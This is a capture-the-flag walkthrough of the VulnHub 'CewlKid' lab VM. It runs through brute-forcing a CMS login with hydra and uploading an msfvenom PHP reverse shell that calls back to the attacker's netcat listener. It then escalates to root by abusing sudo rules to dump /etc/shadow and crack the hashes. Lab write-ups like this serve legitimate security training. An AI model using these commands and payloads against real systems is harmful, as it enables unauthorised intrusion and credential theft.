---
---
# CewlKid 1:

Hello, this is one of my writeups, while studying for the OSCP certification. This VM (found [here](https://www.vulnhub.com/entry/cewlkid-1,559/)) is a nice intermediate level machine.

> I'm not using Kali, or any penTest specific distro. I'm just using my Ubuntu machine. Feel free to use whatever distro you feel comfortable with.


So after you fire up the vm, give it a few minutes to start up all services. Afterwards lets start by scanning the network to identify its IP.
```
netdiscover
```
came up  with the VM's IP : `192.168.1.7`

Lets scan the VM with `nmap -sV` to check what services are exposed.
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-21 09:32 EEST
Nmap scan report for cewlkid (192.168.1.7)
Host is up (0.00010s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds
```
So, there are two web-applications worth checking out. one at port 80 and one at port 8080.

The one at port `80` is simply the default apache page, which is kinda weird as its being served by nginx. Performing an enumaration with `dirb` returns no results. We might come back to it later again.

The one at port `8080` is a cms framework tha seems kinda interesting.

Enumerating it gives several results, nothing too interesting though.

Navigating to `192.168.1.7:8080` we can see that there's a login page. Lets try to crack admin's password, assuming the the username is admin.

To do that we'll need a wordlist. We could use `rockyou.txt`, or any other vast wordlist, but it's going to take a significant amount of time. Let try to narrow our wordlist down a bit. The creator of the VM hints that the VM's title `CewlKid` is also a hint. There's atually a nice tool that crawls websites and creates wordlists based on the findings, named `cewl`. Let's use that:

> Lets ran cewl on te Lipsum page that seems out of place/context

```
ruby cewl.rb "http://192.168.1.7:8080/index.php?SMExt=SMPages&SMPagesId=807ab5c9cb325ace2662fe07d9518055" -m 6 -d 4 -w cewlWordList.txt
```

Lets now use this significantly smaller wordlist with `hydra` to try to crack admin's password.

```
hydra -s 8080 -l admin -P cewlWordlist.txt 192.168.1.7 http-post-form "/index.php?SMExt=SMLogin:SMInputSMLoginUsername=admin&SMInputSMLoginPassword=^PASS^&SMOptionListSMLoginLanguages%5B%5D=en&SMInputSMSearchValue8477222=&SMPostBackControl=SMLinkButtonSMLoginSubmit&SMRequestToken=995e707f38023c69c9067fc8e54726e3:Wrong username or password:H=Cookie: SMSESSION6b631023323ea9ab=o7n82s6fchj4lsl45424s2i9ca"
```

>We must build the above hydra command piece by piece inspecting, a failed login request

This will give us a pasword for admin: Letraset

We need to loigin with this and see if can can inject any code to land a shell in the remote host.

Browsing around, we come across a `files` page inside content menu. This seems quite interesting as it enables uploading files to the webdir.

Lets create a php reverse shell with `msfvenom`:

```
msfvenom -p php/reverse_php LHOST=192.168.1.10 LPORT=6666 -f raw -o attack.php
```

now lets start a netcat listener in another terminal:

```
nc -lnvp 6666
```

Lets upload the file now and try to execute it, by navigating to `http://192.168.1.7:8080/files/images/attack.php`The page hangs and our `netcat` listener has a shell in the system and `python3` to break out of the restricted shell:

>You can also use the reverse shell uploaded already to the VM, provided that you edit it first.

```
Connection received on 192.168.1.7 51886
Linux cewlkid 5.4.0-47-generic #51-Ubuntu SMP Fri Sep 4 19:50:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 06:55:06 up  4:25,  0 users,  load average: 0.00, 0.05, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c "import pty; pty.spawn('bin/bash')"
www-data@cewlkid:/$ 
```

Looking into the `home` dir, we see that we can't access any user's dir.
Running `sudo -l` though, returns that www-data can execute `cat` as user ipsum.

We find a interesting ... dir in `/var/www/example.com/html/...`, which contains a file owned by ipsum. Lets read it:

```
www-data@cewlkid:~/example.com/html/...$ ls -lart
ls -lart
total 12
drwxr-xr-x 10 www-data www-data 4096 Sep  9 00:20 ..
-rwx------  1 ipsum    ipsum      66 Sep  9 00:28 nothing_to_see_here
drwxr-xr-x  2 root     root     4096 Sep  9 00:28 .
www-data@cewlkid:~/example.com/html/...$ sudo -u ipsum cat nothing_to_see_here
<com/html/...$ sudo -u ipsum cat nothing_to_see_here
aXBzdW0gOiBTcGVha1Blb3BsZTIyIQo=
bG9yZW0gOiBQZW9wbGVTcGVhazQ0IQo=
www-data@cewlkid:~/example.com/html/...$ 
```

Lets decode these base64 hashes:
```
www-data@cewlkid:~/example.com/html/...$ echo "bG9yZW0gOiBQZW9wbGVTcGVhazQ0IQo=" | base64 -d
<echo "bG9yZW0gOiBQZW9wbGVTcGVhazQ0IQo=" | base64 -d
lorem : PeopleSpeak44!
www-data@cewlkid:~/example.com/html/...$ echo "aXBzdW0gOiBTcGVha1Blb3BsZTIyIQo=" | base64 -d
<echo "aXBzdW0gOiBTcGVha1Blb3BsZTIyIQo=" | base64 -d
ipsum : SpeakPeople22!
www-data@cewlkid:~/example.com/html/...$ 
```
So it seems we found two user passwords! Lets login with lorem first:
```
www-data@cewlkid:~/example.com/html/...$ su lorem
su lorem
Password: PeopleSpeak44!
```
executing `sudo -l` ginves interesting results.
```
lorem@cewlkid:/var/www/example.com/html/...$ sudo -l
sudo -l
Matching Defaults entries for lorem on cewlkid:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lorem may run the following commands on cewlkid:
    (root : root) NOPASSWD: /usr/bin/base64 /etc/shadow
```
So lorem can base64 encrypt the contents of `/etc/shadow` where the user passwords are stored. Lets do that:
```

lorem@cewlkid:~$ sudo /usr/bin/base64 /etc/shadow
sudo /usr/bin/base64 /etc/shadow
cm9vdDoqOjE4NDc0OjA6OTk5OTk6Nzo6OgpkYWVtb246KjoxODQ3NDowOjk5OTk5Ojc6OjoKYmlu
Oio6MTg0NzQ6MDo5OTk5OTo3Ojo6CnN5czoqOjE4NDc0OjA6OTk5OTk6Nzo6OgpzeW5jOio6MTg0
NzQ6MDo5OTk5OTo3Ojo6CmdhbWVzOio6MTg0NzQ6MDo5OTk5OTo3Ojo6Cm1hbjoqOjE4NDc0OjA6
OTk5OTk6Nzo6OgpscDoqOjE4NDc0OjA6OTk5OTk6Nzo6OgptYWlsOio6MTg0NzQ6MDo5OTk5OTo3
Ojo6Cm5ld3M6KjoxODQ3NDowOjk5OTk5Ojc6OjoKdXVjcDoqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpw
cm94eToqOjE4NDc0OjA6OTk5OTk6Nzo6Ogp3d3ctZGF0YToqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpi
YWNrdXA6KjoxODQ3NDowOjk5OTk5Ojc6OjoKbGlzdDoqOjE4NDc0OjA6OTk5OTk6Nzo6OgppcmM6
KjoxODQ3NDowOjk5OTk5Ojc6OjoKZ25hdHM6KjoxODQ3NDowOjk5OTk5Ojc6OjoKbm9ib2R5Oio6
MTg0NzQ6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpz
eXN0ZW1kLXJlc29sdmU6KjoxODQ3NDowOjk5OTk5Ojc6OjoKc3lzdGVtZC10aW1lc3luYzoqOjE4
NDc0OjA6OTk5OTk6Nzo6OgptZXNzYWdlYnVzOio6MTg0NzQ6MDo5OTk5OTo3Ojo6CnN5c2xvZzoq
OjE4NDc0OjA6OTk5OTk6Nzo6OgpfYXB0Oio6MTg0NzQ6MDo5OTk5OTo3Ojo6CnRzczoqOjE4NDc0
OjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4NDc0OjA6OTk5OTk6Nzo6Ogp0Y3BkdW1wOio6MTg0NzQ6
MDo5OTk5OTo3Ojo6CmxhbmRzY2FwZToqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpwb2xsaW5hdGU6Kjox
ODQ3NDowOjk5OTk5Ojc6OjoKc3NoZDoqOjE4NTEyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVk
dW1wOiEhOjE4NTEyOjo6Ojo6CmtpZGNld2w6JDYkOTloZ09VcVhPUXh6ZHQ4byQxc0FMUmhUaGs5
Mlo4emdpT2xuWlozbjNqVVc2Ny5rVXRWVnhLSGFMbktBc3Bybm1veVZjazh2WHNOTFY5QlQ0OU9J
TWtJQU1CNVhrN2pNaE5LL25uMToxODUxMjowOjk5OTk5Ojc6OjoKbHhkOiE6MTg1MTI6Ojo6OjoK
aXBzdW06JDYkeUZreE9SYkkuUHI3aE5BViRGUTVCSFdqb2lIUEVDUnpqRnc5MC9mbHZ1NzFpbkJU
djVGZlhUOXI3eTZ2VlNVL2lmTU5WWkoxdDFrNDNhcXl3Yi5CalNyOW5YeDJ1S0s3YkZ2OHRFLjox
ODUxNDowOjk5OTk5Ojc6OjoKbG9yZW06JDYkUzhsWlF5eEJrTjM0a3NiUiRnYXBsN09nbm1DeTBn
RzBvRzJjOTJnL0pHbGgvMHZnRVFneGh6UlR6NDZGZWpkN0lFTkZsUEdrZ1BVa1hLcVVPaUlsM1Zj
LjdGVGRtZ3FOQVB3R0ZnLjoxODUxNDowOjk5OTk5Ojc6OjoKemVyb2Nld2w6JDYkVmRENWpPbkVN
VWdqaUxXaiRnSzMxNXZMejgyTjJCUEtKQjJ0bFdRZkdIaWxnbW1qcVVReDZHWERHU1ZkWFMuV0Z1
cml0ZEIzaGFNa0RQeVROUFRyNFB2OGpJTjU0SmswakhpZUxmLjoxODUxNDowOjk5OTk5Ojc6OjoK
Y2V3bGJlYW5zOiQ2JDVmRndRazRhM1U3dE93Tmskdkdnd3YybVBmc3FGckpHV3NHeDJ2Ulo2OU5X
MmhiQnQ1YVh6RGtHRm5Nd1hrMnFBZUtXQlpqWTJudTllTnJMVnY5VnRpSEQ3elV5QS91RVFMbUpG
ejE6MTg1MTQ6MDo5OTk5OTo3Ojo6Cg==
lorem@cewlkid:~$ 
```

Now lets decode its contents on the spot:
```
lorem@cewlkid:~$ echo "cm9vdDoqOjE4NDc0OjA6OTk5OTk6Nzo6OgpkYWVtb246KjoxODQ3NDowOjk5OTk5Ojc6OjoKYmlu
Oio6MTg0NzQ6MDo5OTk5OTo3Ojo6CnN5czoqOjE4NDc0OjA6OTk5OTk6Nzo6OgpzeW5jOio6MTg0
NzQ6MDo5OTk5OTo3Ojo6CmdhbWVzOio6MTg0NzQ6MDo5OTk5OTo3Ojo6Cm1hbjoqOjE4NDc0OjA6
OTk5OTk6Nzo6OgpscDoqOjE4NDc0OjA6OTk5OTk6Nzo6OgptYWlsOio6MTg0NzQ6MDo5OTk5OTo3
Ojo6Cm5ld3M6KjoxODQ3NDowOjk5OTk5Ojc6OjoKdXVjcDoqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpw
cm94eToqOjE4NDc0OjA6OTk5OTk6Nzo6Ogp3d3ctZGF0YToqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpi
YWNrdXA6KjoxODQ3NDowOjk5OTk5Ojc6OjoKbGlzdDoqOjE4NDc0OjA6OTk5OTk6Nzo6OgppcmM6
KjoxODQ3NDowOjk5OTk5Ojc6OjoKZ25hdHM6KjoxODQ3NDowOjk5OTk5Ojc6OjoKbm9ib2R5Oio6
MTg0NzQ6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpz
eXN0ZW1kLXJlc29sdmU6KjoxODQ3NDowOjk5OTk5Ojc6OjoKc3lzdGVtZC10aW1lc3luYzoqOjE4
NDc0OjA6OTk5OTk6Nzo6OgptZXNzYWdlYnVzOio6MTg0NzQ6MDo5OTk5OTo3Ojo6CnN5c2xvZzoq
OjE4NDc0OjA6OTk5OTk6Nzo6OgpfYXB0Oio6MTg0NzQ6MDo5OTk5OTo3Ojo6CnRzczoqOjE4NDc0
OjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4NDc0OjA6OTk5OTk6Nzo6Ogp0Y3BkdW1wOio6MTg0NzQ6
MDo5OTk5OTo3Ojo6CmxhbmRzY2FwZToqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpwb2xsaW5hdGU6Kjox
ODQ3NDowOjk5OTk5Ojc6OjoKc3NoZDoqOjE4NTEyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVk
dW1wOiEhOjE4NTEyOjo6Ojo6CmtpZGNld2w6JDYkOTloZ09VcVhPUXh6ZHQ4byQxc0FMUmhUaGs5
Mlo4emdpT2xuWlozbjNqVVc2Ny5rVXRWVnhLSGFMbktBc3Bybm1veVZjazh2WHNOTFY5QlQ0OU9J
TWtJQU1CNVhrN2pNaE5LL25uMToxODUxMjowOjk5OTk5Ojc6OjoKbHhkOiE6MTg1MTI6Ojo6OjoK
aXBzdW06JDYkeUZreE9SYkkuUHI3aE5BViRGUTVCSFdqb2lIUEVDUnpqRnc5MC9mbHZ1NzFpbkJU
djVGZlhUOXI3eTZ2VlNVL2lmTU5WWkoxdDFrNDNhcXl3Yi5CalNyOW5YeDJ1S0s3YkZ2OHRFLjox
ODUxNDowOjk5OTk5Ojc6OjoKbG9yZW06JDYkUzhsWlF5eEJrTjM0a3NiUiRnYXBsN09nbm1DeTBn
RzBvRzJjOTJnL0pHbGgvMHZnRVFneGh6UlR6NDZGZWpkN0lFTkZsUEdrZ1BVa1hLcVVPaUlsM1Zj
LjdGVGRtZ3FOQVB3R0ZnLjoxODUxNDowOjk5OTk5Ojc6OjoKemVyb2Nld2w6JDYkVmRENWpPbkVN
VWdqaUxXaiRnSzMxNXZMejgyTjJCUEtKQjJ0bFdRZkdIaWxnbW1qcVVReDZHWERHU1ZkWFMuV0Z1
cml0ZEIzaGFNa0RQeVROUFRyNFB2OGpJTjU0SmswakhpZUxmLjoxODUxNDowOjk5OTk5Ojc6OjoK
Y2V3bGJlYW5zOiQ2JDVmRndRazRhM1U3dE93Tmskdkdnd3YybVBmc3FGckpHV3NHeDJ2Ulo2OU5X
MmhiQnQ1YVh6RGtHRm5Nd1hrMnFBZUtXQlpqWTJudTllTnJMVnY5VnRpSEQ3elV5QS91RVFMbUpG
<Tk6Nzo6OgpkYWVtb246KjoxODQ3NDowOjk5OTk5Ojc6OjoKYmlu
<jo6CnN5czoqOjE4NDc0OjA6OTk5OTk6Nzo6OgpzeW5jOio6MTg0
<WVzOio6MTg0NzQ6MDo5OTk5OTo3Ojo6Cm1hbjoqOjE4NDc0OjA6
<Dc0OjA6OTk5OTk6Nzo6OgptYWlsOio6MTg0NzQ6MDo5OTk5OTo3
<jk5OTk5Ojc6OjoKdXVjcDoqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpw
<Tk6Nzo6Ogp3d3ctZGF0YToqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpi
<Tk5Ojc6OjoKbGlzdDoqOjE4NDc0OjA6OTk5OTk6Nzo6OgppcmM6
<joKZ25hdHM6KjoxODQ3NDowOjk5OTk5Ojc6OjoKbm9ib2R5Oio6
<nN5c3RlbWQtbmV0d29yazoqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpz
<DQ3NDowOjk5OTk5Ojc6OjoKc3lzdGVtZC10aW1lc3luYzoqOjE4
<XNzYWdlYnVzOio6MTg0NzQ6MDo5OTk5OTo3Ojo6CnN5c2xvZzoq
<gpfYXB0Oio6MTg0NzQ6MDo5OTk5OTo3Ojo6CnRzczoqOjE4NDc0
<DoqOjE4NDc0OjA6OTk5OTk6Nzo6Ogp0Y3BkdW1wOio6MTg0NzQ6
<2FwZToqOjE4NDc0OjA6OTk5OTk6Nzo6Ogpwb2xsaW5hdGU6Kjox
<3NoZDoqOjE4NTEyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVk
<mtpZGNld2w6JDYkOTloZ09VcVhPUXh6ZHQ4byQxc0FMUmhUaGs5
<y5rVXRWVnhLSGFMbktBc3Bybm1veVZjazh2WHNOTFY5QlQ0OU9J
<ToxODUxMjowOjk5OTk5Ojc6OjoKbHhkOiE6MTg1MTI6Ojo6OjoK
<HI3aE5BViRGUTVCSFdqb2lIUEVDUnpqRnc5MC9mbHZ1NzFpbkJU
<U5WWkoxdDFrNDNhcXl3Yi5CalNyOW5YeDJ1S0s3YkZ2OHRFLjox
<G9yZW06JDYkUzhsWlF5eEJrTjM0a3NiUiRnYXBsN09nbm1DeTBn
<VFneGh6UlR6NDZGZWpkN0lFTkZsUEdrZ1BVa1hLcVVPaUlsM1Zj
<DUxNDowOjk5OTk5Ojc6OjoKemVyb2Nld2w6JDYkVmRENWpPbkVN
<jJCUEtKQjJ0bFdRZkdIaWxnbW1qcVVReDZHWERHU1ZkWFMuV0Z1
<FB2OGpJTjU0SmswakhpZUxmLjoxODUxNDowOjk5OTk5Ojc6OjoK
<zRhM1U3dE93Tmskdkdnd3YybVBmc3FGckpHV3NHeDJ2Ulo2OU5X
<nFBZUtXQlpqWTJudTllTnJMVnY5VnRpSEQ3elV5QS91RVFMbUpG
> " | base64 -d
ejE6MTg1MTQ6MDo5OTk5OTo3Ojo6Cg==" | base64 -d
root:*:18474:0:99999:7:::
daemon:*:18474:0:99999:7:::
bin:*:18474:0:99999:7:::
sys:*:18474:0:99999:7:::
sync:*:18474:0:99999:7:::
games:*:18474:0:99999:7:::
man:*:18474:0:99999:7:::
lp:*:18474:0:99999:7:::
mail:*:18474:0:99999:7:::
news:*:18474:0:99999:7:::
uucp:*:18474:0:99999:7:::
proxy:*:18474:0:99999:7:::
www-data:*:18474:0:99999:7:::
backup:*:18474:0:99999:7:::
list:*:18474:0:99999:7:::
irc:*:18474:0:99999:7:::
gnats:*:18474:0:99999:7:::
nobody:*:18474:0:99999:7:::
systemd-network:*:18474:0:99999:7:::
systemd-resolve:*:18474:0:99999:7:::
systemd-timesync:*:18474:0:99999:7:::
messagebus:*:18474:0:99999:7:::
syslog:*:18474:0:99999:7:::
_apt:*:18474:0:99999:7:::
tss:*:18474:0:99999:7:::
uuidd:*:18474:0:99999:7:::
tcpdump:*:18474:0:99999:7:::
landscape:*:18474:0:99999:7:::
pollinate:*:18474:0:99999:7:::
sshd:*:18512:0:99999:7:::
systemd-coredump:!!:18512::::::
kidcewl:$6$99hgOUqXOQxzdt8o$1sALRhThk92Z8zgiOlnZZ3n3jUW67.kUtVVxKHaLnKAsprnmoyVck8vXsNLV9BT49OIMkIAMB5Xk7jMhNK/nn1:18512:0:99999:7:::
lxd:!:18512::::::
ipsum:$6$yFkxORbI.Pr7hNAV$FQ5BHWjoiHPECRzjFw90/flvu71inBTv5FfXT9r7y6vVSU/ifMNVZJ1t1k43aqywb.BjSr9nXx2uKK7bFv8tE.:18514:0:99999:7:::
lorem:$6$S8lZQyxBkN34ksbR$gapl7OgnmCy0gG0oG2c92g/JGlh/0vgEQgxhzRTz46Fejd7IENFlPGkgPUkXKqUOiIl3Vc.7FTdmgqNAPwGFg.:18514:0:99999:7:::
zerocewl:$6$VdD5jOnEMUgjiLWj$gK315vLz82N2BPKJB2tlWQfGHilgmmjqUQx6GXDGSVdXS.WFuritdB3haMkDPyTNPTr4Pv8jIN54Jk0jHieLf.:18514:0:99999:7:::
cewlbeans:$6$5fFwQk4a3U7tOwNk$vGgwv2mPfsqFrJGWsGx2vRZ69NW2hbBt5aXzDkGFnMwXk2qAeKWBZjY2nu9eNrLVv9VtiHD7zUyA/uEQLmJFz1:18514:0:99999:7:::
lorem@cewlkid:~$ 
```
We got the hashes of almost all users. Lets try to crack some of them with `hashcat`. Lets create a hashes.txt file first with the hashes of kidcewl, zerocewl and cewlbeans:
```
test@TestPad:~/workspace/security/test$ cat hashes.txt 
$6$99hgOUqXOQxzdt8o$1sALRhThk92Z8zgiOlnZZ3n3jUW67.kUtVVxKHaLnKAsprnmoyVck8vXsNLV9BT49OIMkIAMB5Xk7jMhNK/nn1
$6$VdD5jOnEMUgjiLWj$gK315vLz82N2BPKJB2tlWQfGHilgmmjqUQx6GXDGSVdXS.WFuritdB3haMkDPyTNPTr4Pv8jIN54Jk0jHieLf.
$6$5fFwQk4a3U7tOwNk$vGgwv2mPfsqFrJGWsGx2vRZ69NW2hbBt5aXzDkGFnMwXk2qAeKWBZjY2nu9eNrLVv9VtiHD7zUyA/uEQLmJFz1

```

Lets now try to crack this with `hashcat`:
```
hashcat -m 1800 -a 0 -o cracked.txt hashes.txt ../wordlists/rockyou.txt
```
> This will take some time. Be patient.

Another quicker path to get the cewlbeans password for this vm would be to check the running processes. in there we can see that cewlbeans' password is exposed in plain text:
```
lorem@cewlkid:~$ ps aux | grep cewl
ps aux | grep cewl
root       15899  0.0  0.8  27088  8372 ?        S    07:51   0:00 /root/pth-toolkit-master/bin/winexe -U cewlbeans%fondateurs //kali whoami
root       15903  0.0  0.8  27088  8312 ?        S    07:52   0:00 /root/pth-toolkit-master/bin/winexe -U cewlbeans%fondateurs //kali whoami
root       15909  0.0  0.8  27088  8288 ?        S    07:53   0:00 /root/pth-toolkit-master/bin/winexe -U cewlbeans%fondateurs //kali whoami
lorem      15912  0.0  0.0   6632   740 pts/3    S+   07:53   0:00 grep --color=auto cewl
lorem@cewlkid:~$ 
```
Lets login as cewlikid now and execute `sudo -l`:
```

lorem@cewlkid:~$ su cewlbeans
su cewlbeans
Password: fondateurs

cewlbeans@cewlkid:/home/lorem$ sudo -l
sudo -l
[sudo] password for cewlbeans: fondateurs

Matching Defaults entries for cewlbeans on cewlkid:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cewlbeans may run the following commands on cewlkid:
    (ALL : ALL) ALL
```
So this user can run everything as root. Lets use that:
```
cewlbeans@cewlkid:/home/lorem$ sudo su
sudo su
root@cewlkid:/home/lorem# cd /root
cd /root
root@cewlkid:~# ls -lart
ls -lart
total 48
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Sep  7 23:42 .ssh
drwxr-xr-x  3 root root 4096 Sep  7 23:42 snap
drwxr-xr-x  3 root root 4096 Sep  8 23:09 .local
drwxr-xr-x 21 root root 4096 Sep  9 12:11 ..
lrwxrwxrwx  1 root root    9 Sep  9 15:59 .bash_history -> /dev/null
-rw-r--r--  1 root root  209 Sep  9 16:12 .wget-hsts
-rw-r--r--  1 root root   66 Sep  9 17:35 .selected_editor
-rw-------  1 root root   92 Sep  9 22:53 .lesshst
drwxr-xr-x  5 root root 4096 Sep  9 23:44 pth-toolkit-master
-rw-r--r--  1 root root 1983 Sep 10 21:41 root.txt
drwx------  6 root root 4096 Sep 10 21:41 .
root@cewlkid:~# cat root.txt
cat root.txt
        ______  ___________    __    ____  __       __  ___  __   _______                    
       /      ||   ____\   \  /  \  /   / |  |     |  |/  / |  | |       \                   
      |  ,----'|  |__   \   \/    \/   /  |  |     |  '  /  |  | |  .--.  |                  
      |  |     |   __|   \            /   |  |     |    <   |  | |  |  |  |                  
      |  `----.|  |____   \    /\    /    |  `----.|  .  \  |  | |  '--'  |                  
       \______||_______|   \__/  \__/     |_______||__|\__\ |__| |_______/                   
                                                                                             
                  .______        ______     ______   .___________.                           
                  |   _  \      /  __  \   /  __  \  |           |                           
                  |  |_)  |    |  |  |  | |  |  |  | `---|  |----`                           
                  |      /     |  |  |  | |  |  |  |     |  |                                
                  |  |\  \----.|  `--'  | |  `--'  |     |  |                                
                  | _| `._____| \______/   \______/      |__|                                
                                                                                             
.______      .___  ___. ___   ___  __    __   ________  ____    __    ____  ______           
|   _  \     |   \/   | \  \ /  / |  |  |  | |       /  \   \  /  \  /   / /  __  \   ______ 
|  |_)  |    |  \  /  |  \  V  /  |  |__|  | `---/  /    \   \/    \/   / |  |  |  | |______|
|      /     |  |\/|  |   >   <   |   __   |    /  /      \            /  |  |  |  |  ______ 
|  |\  \----.|  |  |  |  /  .  \  |  |  |  |   /  /----.   \    /\    /   |  `--'  | |______|
| _| `._____||__|  |__| /__/ \__\ |__|  |__|  /________|    \__/  \__/     \______/          
RmxhZwo=                                                                                             

root@cewlkid:~# 

```

### I hope that you enjoyed this VM as much as I did.
